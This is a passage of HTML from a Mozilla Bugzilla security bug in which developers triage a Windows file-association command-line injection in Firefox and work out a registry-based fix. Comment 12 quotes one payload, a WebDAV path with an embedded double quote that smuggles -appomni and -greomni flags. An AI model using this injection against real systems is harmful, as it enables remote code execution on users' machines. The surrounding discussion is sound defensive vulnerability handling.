          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-6"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-6" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1606596#c6">Comment 6</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-01-03 07:38 PST" data-time="1578065895">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-6">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-6" data-comment-id="14571820" data-ismarkdown="true" ><p>(In reply to Joshua Graham from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1606596#c5" title="RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox">comment #5</a>)</p>
<blockquote>
<p>I&#39;m a little confused by the &quot;at a certain path&quot; and &quot;unique to the install path&quot; parts of your comment. Custom made associations are added to <code>HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts\&lt;extension&gt;\UserChoice</code> and when you chose Firefox it gets the value <code>Applications\firefox</code> which points it to the <code>HKCR\Applications\firefox.exe</code> key.</p>
</blockquote>
<p>The problem is that the only thing that names that key is the string <code>firefox.exe</code>, but the command string has to contain an absolute path to a specific installation; there&#39;s an implicit assumption there that only one binary called <code>firefox.exe</code> ever exists on a machine, but we explicitly support having multiple installations of Firefox that can all participate in file associations, so that assumption is wrong for us. The file type keys that we create have names that start with <code>FirefoxHTML</code>, followed by an installation-specific hash, so that more than one installation can participate in file associations and not just the most recently installed one. A key just named <code>firefox.exe</code> breaks this support. Chrome can sometimes avoid problems like this because they don&#39;t have general support for multiple installations, but one of the specific cases they do support is having different channels installed, so this breaks even that because every channel calls its binary <code>chrome.exe</code> just as ours are always <code>firefox.exe</code>.</p>
<p>It&#39;s possible we could do something like check on startup for an <code>HKCR\Applications\firefox.exe</code> key and manually update its command line no matter what installation it&#39;s for. That would still leave the first launch after the file association is created vulnerable, but it&#39;s something.</p>
<blockquote>
<p>Google Chrome was vulnerable to this issue a few months back but it looks like they have patched it (not reported by me). When you set chrome to be the default it&#39;s <code>UserChoice</code> value becomes <code>Applications\chrome.exe</code> which has the value <code>C:\Program Files...\chrome.exe -- %1%</code>. The <code>--</code> is equivalent to <code>-osint -url</code> in Firefox so it must be possible to update that registry key?</p>
</blockquote>
<p>Hmm, I don&#39;t see where that&#39;s happening; for me running release Chrome, the <code>Applications\chrome.exe</code> key gets created by <code>OpenWith.exe</code> with the same sort of command line it uses for us, without the <code>--</code>, and that is the command line that&#39;s used to create the process (that is, nothing is overriding it). I thought that maybe Chrome would rewrite the registry value when it starts, but it doesn&#39;t touch it; neither does the installer. I can&#39;t find any code that would explicitly do this via their code search tool, either. Do you know if maybe that fix just isn&#39;t on their release channel yet?</p>
</div></div><div class="change-set" id="c7"><div class="comment" data-id="14572814" data-no="7"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-7" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_600722" id="a13086_159069"><img src="https://secure.gravatar.com/avatar/645309812b791b24a1d272e82e633f19?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_600722" id="a13086_159069"><a class="email " href="/user_profile?user_id=600722" > <span class="fna">Joshua Graham</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-7"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-7" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1606596#c7">Comment 7</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-01-04 05:15 PST" data-time="1578143734">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-7">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-7" data-comment-id="14572814" data-ismarkdown="true" ><p>I&#39;ve tried on two different computer with the same version of release chrome. One is windows 10 Pro (adds --), one is Enterprise (doesn&#39;t add --). It may have nothing to do with the windows version but i&#39;m at a loss to explain what is going on sorry.</p>
</div></div><div class="change-set" id="a333287_1689"><div class="change" id="aa333287_1689">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_1689" id="a333287_1689"><img src="https://secure.gravatar.com/avatar/da6b54ad3fdb36ba7656df9adfe65d12?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_1689" id="a333287_1689"><a class="email " href="/user_profile?user_id=1689" > <span class="fna">Daniel Veditz [:dveditz]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a333287_1689"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a333287_1689">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1606596#a333287_1689">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-01-05 20:29 PST" data-time="1578284970">2 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Depends on: <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Evaluate whether the greomni and appomni command line args can be removed or have restrictions for their paths"
   href="/show_bug.cgi?id=1531475">1531475</a></div><div class="change">Keywords: <a href="/buglist.cgi?keywords=csectype-priv-escalation&amp;resolution=---">csectype-priv-escalation</a>, 
          
            <a href="/buglist.cgi?keywords=sec-high&amp;resolution=---">sec-high</a></div></div></div><div class="change-set" id="c8"><div class="comment" data-id="14576375" data-no="8"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-8" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_47192" id="a333287_1689"><img src="https://secure.gravatar.com/avatar/5d5f37905f36ca9989f88861a702cff3?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_47192" id="a333287_1689"><a class="email " href="/user_profile?user_id=47192" > <span class="fna">Mike Hommey [:glandium]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-8"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-8" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1606596#c8">Comment 8</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-01-06 14:28 PST" data-time="1578349708">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-8">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-8" data-comment-id="14576375" data-ismarkdown="true" ><p>I wonder at what stage of the command line &quot;parsing&quot; we end up considering what was supposed to be passed as one argument as multiple ones, including flags.</p>
</div></div><div class="change-set" id="c9"><div class="comment" data-id="14576395" data-no="9"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-9" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_550257" id="a333287_1689"><img src="https://secure.gravatar.com/avatar/3f97cf08c1ecf35bc10896cf363773e5?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_550257" id="a333287_1689"><a class="email " href="/user_profile?user_id=550257" > <span class="fna">Molly Howell (she/her) [:mhowell] (PTO until Nov 1)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-9"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-9" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1606596#c9">Comment 9</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-01-06 14:37 PST" data-time="1578350242">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-9">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-9" data-comment-id="14576395" data-ismarkdown="true" ><p>As a workaround, I can have the installer/updater preemptively create <code>{HKLM,HKCU}\Applications\firefox.exe</code> and fill it in with the correct command line. That will mean we get listed as an option in Open With for every file type, which I don&#39;t like, but by adding a <code>SupportedTypes</code> key we can at least keep our entry below the fold for all the types we don&#39;t support. It also means that only one installation at a time can be set this way, as discussed above, but I think that would more or less match the current behavior. I&#39;m going to test out that idea and see if it works the way I hope it does and doesn&#39;t break anything else.</p>
<p>I still think the best fix is on the command-line handling side though, either by altering the parsing or by removing or restricting the arguments involved.</p>
</div></div><div class="change-set" id="c10"><div class="comment" data-id="14576483" data-no="10"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-10" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_159069" id="a333287_1689"><img src="https://secure.gravatar.com/avatar/66445733c06687eafa2978764675104f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_159069" id="a333287_1689"><a class="email " href="/user_profile?user_id=159069" > <span class="fna">:Gijs (he/him)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-10"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-10" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1606596#c10">Comment 10</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-01-06 15:47 PST" data-time="1578354421">2 years ago</span>
          </div>&bull;
<div class="change-revisions">
  <a href="/page.cgi?id=comment-revisions.html&amp;bug_id=1606596&amp;comment_id=14576483"
     title="1 revision">Edited</a>
</div>
        </td>
      </tr>

      <tr id="ctag-10">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-10" data-comment-id="14576483" data-ismarkdown="true" ><p>(In reply to Mike Hommey [:glandium] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1606596#c8" title="RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox">comment #8</a>)</p>
<blockquote>
<p>I wonder at what stage of the command line &quot;parsing&quot; we end up considering what was supposed to be passed as one argument as multiple ones, including flags.</p>
</blockquote>
<p>I expect it&#39;s just that we get the arguments&#39; argv/argc combo in <code>main()</code> with the wrong values? The docs at <a href="https://docs.microsoft.com/en-us/cpp/cpp/main-function-command-line-args?view=vs-2019#parsing-c-command-line-arguments" rel="nofollow">https://docs.microsoft.com/en-us/cpp/cpp/main-function-command-line-args?view=vs-2019#parsing-c-command-line-arguments</a> (and the sad tales at <a href="https://docs.microsoft.com/en-gb/archive/blogs/twistylittlepassagesallalike/everyone-quotes-command-line-arguments-the-wrong-way" rel="nofollow">https://docs.microsoft.com/en-gb/archive/blogs/twistylittlepassagesallalike/everyone-quotes-command-line-arguments-the-wrong-way</a> ) seem to suggest that to me, but I could be wrong about that. (to offer slightly more detail: the double quotes in the file path seem to cause the subsequent arguments to be parsed as individual arguments by the C++ runtime / Windows / whatever -- rather than as a single string, which is how they were intended)</p>
<p>Would we be able to usefully put things back together at that point, in a way that wouldn&#39;t break legitimate uses? It seems pretty audacious to be claiming we can do the arg parsing better than the OS, especially if information (about escaping etc.) already got thrown away when the URL was initially passed by the OS. Nathan, what do you think?</p>
</div><div class="activity"><div class="change">Flags: needinfo?(nfroyd)</div></div></div><div class="change-set" id="c11"><div class="comment" data-id="14576510" data-no="11"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-11" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_47192" id="a333287_1689"><img src="https://secure.gravatar.com/avatar/5d5f37905f36ca9989f88861a702cff3?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_47192" id="a333287_1689"><a class="email " href="/user_profile?user_id=47192" > <span class="fna">Mike Hommey [:glandium]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-11"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-11" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1606596#c11">Comment 11</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-01-06 16:03 PST" data-time="1578355438">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-11">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-11" data-comment-id="14576510" data-ismarkdown="true" ><p>My reading of your comment is that Windows itself would be doing something wrong and there&#39;s not much we can do about it, except not allowing any flags on the command line at all...</p>
</div></div><div class="change-set" id="c12"><div class="comment" data-id="14578268" data-no="12"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-12" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_159069" id="a333287_1689"><img src="https://secure.gravatar.com/avatar/66445733c06687eafa2978764675104f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_159069" id="a333287_1689"><a class="email " href="/user_profile?user_id=159069" > <span class="fna">:Gijs (he/him)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-12"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-12" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1606596#c12">Comment 12</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-01-07 10:10 PST" data-time="1578420657">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-12">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-12" data-comment-id="14578268" data-ismarkdown="true" ><p>(In reply to Mike Hommey [:glandium] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1606596#c11" title="RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox">comment #11</a>)</p>
<blockquote>
<p>My reading of your comment is that Windows itself would be doing something wrong and there&#39;s not much we can do about it, except not allowing any flags on the command line at all...</p>
</blockquote>
<p>This is my interpretation of <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1606596#c0" title="RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox">comment #0</a>, yeah, esp:</p>
<blockquote>
<p>Although it shouldn&#39;t be possible to inject double quotes in a file path in windows as the double quote character is illegal in a file path, Microsoft has confirmed that they won&#39;t be fixing this issue (<a href="https://www.zerodayinitiative.com/advisories/ZDI-19-1023/" rel="nofollow">https://www.zerodayinitiative.com/advisories/ZDI-19-1023/</a>)</p>
</blockquote>
<p>That is, my understanding is that Windows&#39; system for quoting means that the <code>&quot;</code> in the filename ought to be preceded by a <code>\</code>. I&#39;d expect the steps from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1606596#c0" title="RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox">comment #0</a> with:</p>
<blockquote>
<pre><code>\\poiu.xss.vg@ssl\a.txt\&quot; -appomni appomni.pdf -greomni \share\greomni.pdf
</code></pre>
</blockquote>
<p>To be parsed correctly, assuming the windows run dialog basically resolves the entire string as a file, then passes it to Firefox in double quotes - because after all, file names can&#39;t contain double quotes. Except here, they do.</p>
<p>But that report points to a webdav issue. Reporter, can you clarify whether a similar exploit also works with other applications and their commandline switches? (doesn&#39;t necessarily have to do anything &quot;bad&quot;, just, does it break commandline parsing for all apps, or are we the odd one out?)</p>
<p>Anyway, it&#39;s also totally plausible that I&#39;m misreading what&#39;s going on here. But I <em>think</em> our commandline parsing by and large trusts the argv/argc stuff we get, and doesn&#39;t try to take a full input string and parse it ourselves in some way - or otherwise reconstitute command line switches or what-have-you.</p>
</div><div class="activity"><div class="change">Flags: needinfo?(jpg.inc.au)</div></div></div><div class="change-set" id="c13"><div class="comment" data-id="14578434" data-no="13"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-13" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_550257" id="a333287_1689"><img src="https://secure.gravatar.com/avatar/3f97cf08c1ecf35bc10896cf363773e5?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_550257" id="a333287_1689"><a class="email " href="/user_profile?user_id=550257" > <span class="fna">Molly Howell (she/her) [:mhowell] (PTO until Nov 1)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-13"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-13" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1606596#c13">Comment 13</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-01-07 11:23 PST" data-time="1578424992">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-13">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-13" data-comment-id="14578434" data-ismarkdown="true" ><p>The workaround I mentioned in <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1606596#c9" title="RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox">comment 9</a> does appear to do the job, as in processes that are created to open files with custom associations get the correct command line after that change, and it doesn&#39;t seem to have any confusing effects on the open with dialog (I tried it on Windows 7 and 10). So, since the command-line handling side is still under active discussion I think it&#39;s a good idea to go ahead and get that patch moving.</p>
</div></div><div class="change-set" id="c14"><div class="comment" data-id="14578444" data-no="14"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-14" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_550257" id="a333287_1689"><img src="https://secure.gravatar.com/avatar/3f97cf08c1ecf35bc10896cf363773e5?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_550257" id="a333287_1689"><a class="email " href="/user_profile?user_id=550257" > <span class="fna">Molly Howell (she/her) [:mhowell] (PTO until Nov 1)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-14"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-14" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1606596#c14">Comment 14</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-01-07 11:29 PST" data-time="1578425349">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-14">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-9119189"
         class="attachment"
         data-id="9119189" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="phabricator-D58994-url.txt">
      <meta itemprop="contentSize" content="47">
      <meta itemprop="encodingFormat" content="text/x-phabricator-request">
      <div class="label">
        Attached file
          <a class="link" href="attachment.cgi?id=9119189" itemprop="contentUrl">
        <span id="att-9119189-description" itemprop="description">Bug 1606596 - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin</span></a>
        — <a href="attachment.cgi?id=9119189&amp;action=edit" itemprop="url">Details</a>
      </div>
    </div></div><div class="change-set" id="a473666_600971"><div class="change" id="aa473666_600971">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_600971" id="a473666_600971"><img src="https://secure.gravatar.com/avatar/a088418052679d9583556d277e6774ee?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_600971" id="a473666_600971"><a class="email " href="/user_profile?user_id=600971" > <span class="fna">Phabricator Automation</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a473666_600971"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a473666_600971">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1606596#a473666_600971">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-01-07 11:29 PST" data-time="1578425349">2 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Assignee: nobody &rarr; mhowell</div></div></div><div class="change-set" id="c15"><div class="comment" data-id="14578655" data-no="15"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-15" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_600722" id="a473666_600971"><img src="https://secure.gravatar.com/avatar/645309812b791b24a1d272e82e633f19?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_600722" id="a473666_600971"><a class="email " href="/user_profile?user_id=600722" > <span class="fna">Joshua Graham</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-15"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-15" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1606596#c15">Comment 15</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-01-07 13:20 PST" data-time="1578432024">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-15">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-15" data-comment-id="14578655" data-ismarkdown="true" ><blockquote>
<p>But that report points to a webdav issue. Reporter, can you clarify whether a similar exploit also works with other applications and their commandline switches? (doesn&#39;t necessarily have to do anything &quot;bad&quot;, just, does it break commandline parsing for all apps, or are we the odd one out?)</p>
</blockquote>
<p>Yes, this is not a Firefox specific issue. Similar exploits work on other applications. The Zero Day Initiative report detailed the underlying issue to Microsoft (i.e. fix the WebDAV client so that double quotes can&#39;t appear in the path) in the hope that the attack vector could be killed altogether. Since the attack vector will remain I decided to report it to the individual applications to see if they could mitigate the risk themselves.</p>
<p>Do you still need my WebDAV server up for you to reproduce the issue? or am I OK to take it down?</p>
</div><div class="activity"><div class="change">Flags: needinfo?(jpg.inc.au) &rarr; needinfo?(mhowell)</div></div></div><div class="change-set" id="c16"><div class="comment" data-id="14578662" data-no="16"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-16" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_550257" id="a473666_600971"><img src="https://secure.gravatar.com/avatar/3f97cf08c1ecf35bc10896cf363773e5?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_550257" id="a473666_600971"><a class="email " href="/user_profile?user_id=550257" > <span class="fna">Molly Howell (she/her) [:mhowell] (PTO until Nov 1)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-16"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-16" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1606596#c16">Comment 16</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-01-07 13:24 PST" data-time="1578432277">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-16">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-16" data-comment-id="14578662" data-ismarkdown="true" ><p>I don&#39;t need the WebDAV server for my part; redirecting to Gijs who asked about it.</p>
</div><div class="activity"><div class="change">Flags: needinfo?(mhowell) &rarr; needinfo?(gijskruitbosch+bugs)</div></div></div><div class="change-set" id="c17"><div class="comment" data-id="14578756" data-no="17"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-17" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_159069" id="a473666_600971"><img src="https://secure.gravatar.com/avatar/66445733c06687eafa2978764675104f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_159069" id="a473666_600971"><a class="email " href="/user_profile?user_id=159069" > <span class="fna">:Gijs (he/him)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-17"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-17" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1606596#c17">Comment 17</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-01-07 14:09 PST" data-time="1578434973">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-17">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-17" data-comment-id="14578756" data-ismarkdown="true" ><p>The webdav server is probably going to be useful to QA to verify that the issue is fixed, so if it is not onerous to keep the server up I think that would be desirable. If it isn&#39;t viable for you to do so, where would I look for instructions to set this type of thing up ourselves?</p>
</div><div class="activity"><div class="change">Flags: needinfo?(gijskruitbosch+bugs) &rarr; needinfo?(jpg.inc.au)</div></div></div><div class="change-set" id="c18"><div class="comment" data-id="14578910" data-no="18"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-18" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_600722" id="a473666_600971"><img src="https://secure.gravatar.com/avatar/645309812b791b24a1d272e82e633f19?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_600722" id="a473666_600971"><a class="email " href="/user_profile?user_id=600722" > <span class="fna">Joshua Graham</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-18"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-18" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1606596#c18">Comment 18</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-01-07 15:16 PST" data-time="1578438976">2 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-18">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-18" data-comment-id="14578910" data-ismarkdown="true" ><p>I&#39;m happy to keep it online. I&#39;ll attach the server code to this bug when I get home so you can reproduce it in case my server dies for some reason.</p>
</div><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(jpg.inc.au)</span></div></div></div><div class="change-set" id="c19"><div class="comment" data-id="14578920" data-no="19"
       data-tags="">
    
